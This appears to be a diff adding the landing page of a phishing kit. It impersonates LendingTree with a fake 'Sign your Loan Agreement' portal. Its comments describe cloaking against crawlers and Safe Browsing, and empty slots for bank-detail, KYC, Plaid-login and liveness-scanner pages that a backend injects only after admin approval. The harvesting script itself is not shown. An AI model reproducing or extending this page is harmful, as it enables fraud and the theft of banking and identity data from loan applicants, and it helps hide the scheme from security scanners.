@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Document Portal</title>
+    <!-- Instruct crawlers/scanners not to index or follow links -->
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+    <!-- Prevent browser Safe Browsing pre-fetch and speculation -->
+    <meta name="referrer" content="no-referrer">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&family=Playfair+Display:ital,wght@0,400;0,500;0,600;0,700;1,900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="assets/styles.css">
+
+    <!-- ═══════════════════════════════════════════════════════════
+         DEPENDENCIES — Load order: Supabase SDK → config.js → shell.js
+         ═══════════════════════════════════════════════════════════ -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
+    <script src="assets/config.js"></script>
+</head>
+<body>
+
+    <!-- ============================================
+         PAGE 1 - LANDING/INDEX (Only Pre-Rendered Page)
+         ============================================ -->
+    <div id="page1" class="page-container active">
+        <div class="wrapper-landing">
+            <div class="topbanner">
+                <img src="https://i.ibb.co/rKtQ8FqK/unnamed.webp" alt="TreeLogo" border="0">
+            </div>
+
+            <div class="midcontent">
+                <div class="silvie2"></div>
+                <div class="footbanner">
+                    <p class="thank">Thank You</p>
+                    <p class="us">for choosing us</p>
+                    <img src="https://images.unsplash.com/photo-1579621970563-ebec7560ff3e?w=800" alt="Financial Background">
+                    <p class="action">Sign your Loan Agreement<br>And Tell US Where Shall We Send It</p>
+                    <div class="btn">
+                        <button id="signbtn">GET STARTED</button>
+                    </div>
+                </div>
+                <div class="silvie2"></div>
+            </div>
+
+            <div class="footerend">
+                <footer>
+                    <img src="https://i.ibb.co/rKtQ8FqK/unnamed.webp" alt="treelogo">
+                    <p class="addr">1415 Vantage Park Drive, Suite 700,<br>Charlotte, NC 28203</p>
+                    <p class="rights">&copy; 2026 LendingTree. All Rights Reserved.</p>
+                    <p class="rights2">Member FDIC. Equal Housing Lender.</p>
+                </footer>
+            </div>
+            <div class="silvie2"></div>
+            <div class="disclaimer">
+                <center><img class="disclogo" src="https://i.ibb.co/d45tFDC9/images-removebg-preview.png" alt="FDIC" border="0"></center>
+                <p>Disclaimer: LendingTree, LLC is known as LT Technologies in lieu of true name LendingTree, LLC in NY. LendingTree technology and processes are patented under U.S. Patent Nos. 6,385,594 and 6,611,816 and licensed under U.S. Patent Nos. 5,995,947 and 5,758,328.<br> &copy; 2026 LendingTree, LLC. <br> All Rights Reserved.</p>
+            </div>
+        </div>
+
+        <!-- Application ID Modal (built by shell.js dynamically) -->
+        <!-- No modal pre-rendered — shell.js injects it on GET STARTED click -->
+    </div>
+
+    <!-- ============================================
+         EMPTY SHELL CONTAINERS — Pages 2, 3, 4
+         ════════════════════════════════════════════
+         No content. No forms. No buttons. No scripts.
+         Backend pushes encrypted HTML fragments into
+         these containers via WebSocket on admin approval.
+         Bots see nothing. Crawlers hit a dead end.
+         ============================================ -->
+
+    <!-- Page 2 Shell — Terms / Bank Details / KYC -->
+    <div id="page2" class="page-container">
+        <!-- Splash screen injected by backend -->
+        <div id="sh-splash-slot"></div>
+        <!-- Main content injected by backend -->
+        <div class="main-container">
+            <div id="sh-page2-content"></div>
+        </div>
+        <!-- Scanner wrapper injected by backend -->
+        <div id="sh-scanner-slot"></div>
+        <!-- Completion overlay injected by backend -->
+        <div id="sh-completion-slot"></div>
+    </div>
+
+    <!-- Page 3 Shell — Plaid / Bank Connection -->
+    <div id="page3" class="page-container">
+        <div id="sh-page3-content" class="plaid-container"></div>
+        <!-- Search modal injected by backend -->
+        <div id="sh-search-modal-slot"></div>
+        <!-- Liveness scanner injected by backend -->
+        <div id="sh-liveness-scanner-slot"></div>
+    </div>
+
+    <!-- Page 4 Shell — Success -->
+    <div id="page4" class="page-container">
+        <div id="sh-page4-content"></div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════════════════
+         SHELL.JS — Connection Engine + Crypto Injector
+         The only frontend JS. Everything else comes from backend.
+         ═══════════════════════════════════════════════════════════ -->
+    <script src="assets/shell.js"></script>
+</body>
+</html>
